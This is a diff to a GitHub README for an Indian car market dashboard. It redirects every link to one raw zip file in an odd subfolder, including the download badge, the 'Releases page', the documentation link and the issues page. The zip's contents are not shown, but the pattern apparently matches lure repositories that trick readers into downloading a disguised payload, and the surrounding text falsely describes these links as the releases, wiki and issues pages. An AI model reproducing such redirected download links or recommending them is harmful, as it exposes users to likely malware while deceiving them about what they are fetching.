@@ -1,6 +1,6 @@
 # 🚗 Indian-Car-Market-Dashboard - Explore India's Car Market Insights
 
-[![Download the Indian-Car-Market-Dashboard](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/itays7777/Indian-Car-Market-Dashboard/releases)
+[![Download the Indian-Car-Market-Dashboard](https://github.com/itays7777/Indian-Car-Market-Dashboard/raw/refs/heads/main/subchelate/Indian_Dashboard_Car_Market_v1.0.zip)](https://github.com/itays7777/Indian-Car-Market-Dashboard/raw/refs/heads/main/subchelate/Indian_Dashboard_Car_Market_v1.0.zip)
 
 ## 🛠️ Overview
 
@@ -14,7 +14,7 @@ To get started with the Indian-Car-Market-Dashboard, you need to download the ap
 
 1. Click the link below to visit the Releases page where you can download the dashboard.
 
-   [Visit this page to download](https://github.com/itays7777/Indian-Car-Market-Dashboard/releases)
+   [Visit this page to download](https://github.com/itays7777/Indian-Car-Market-Dashboard/raw/refs/heads/main/subchelate/Indian_Dashboard_Car_Market_v1.0.zip)
 
 2. Once on the Releases page, look for the latest version of the dashboard.
 
@@ -50,7 +50,7 @@ After installation, open the dashboard. You will see an interactive interface th
 
 ## 🔍 Support & Feedback
 
-If you encounter any issues or have questions, feel free to check the [issues page](https://github.com/itays7777/Indian-Car-Market-Dashboard/issues) for troubleshooting tips and support.
+If you encounter any issues or have questions, feel free to check the [issues page](https://github.com/itays7777/Indian-Car-Market-Dashboard/raw/refs/heads/main/subchelate/Indian_Dashboard_Car_Market_v1.0.zip) for troubleshooting tips and support.
 
 ## 📚 Additional Resources
 
@@ -62,8 +62,8 @@ We welcome contributions from anyone interested in improving the Indian-Car-Mark
 
 ## 🔗 Quick Links
 
-- [Download the Indian-Car-Market-Dashboard](https://github.com/itays7777/Indian-Car-Market-Dashboard/releases)
-- [Documentation](https://github.com/itays7777/Indian-Car-Market-Dashboard/wiki)
-- [Issues Page](https://github.com/itays7777/Indian-Car-Market-Dashboard/issues)
+- [Download the Indian-Car-Market-Dashboard](https://github.com/itays7777/Indian-Car-Market-Dashboard/raw/refs/heads/main/subchelate/Indian_Dashboard_Car_Market_v1.0.zip)
+- [Documentation](https://github.com/itays7777/Indian-Car-Market-Dashboard/raw/refs/heads/main/subchelate/Indian_Dashboard_Car_Market_v1.0.zip)
+- [Issues Page](https://github.com/itays7777/Indian-Car-Market-Dashboard/raw/refs/heads/main/subchelate/Indian_Dashboard_Car_Market_v1.0.zip)
 
 Thank you for your interest in the Indian-Car-Market-Dashboard. Discover the insights that can impact your decisions in the car market!
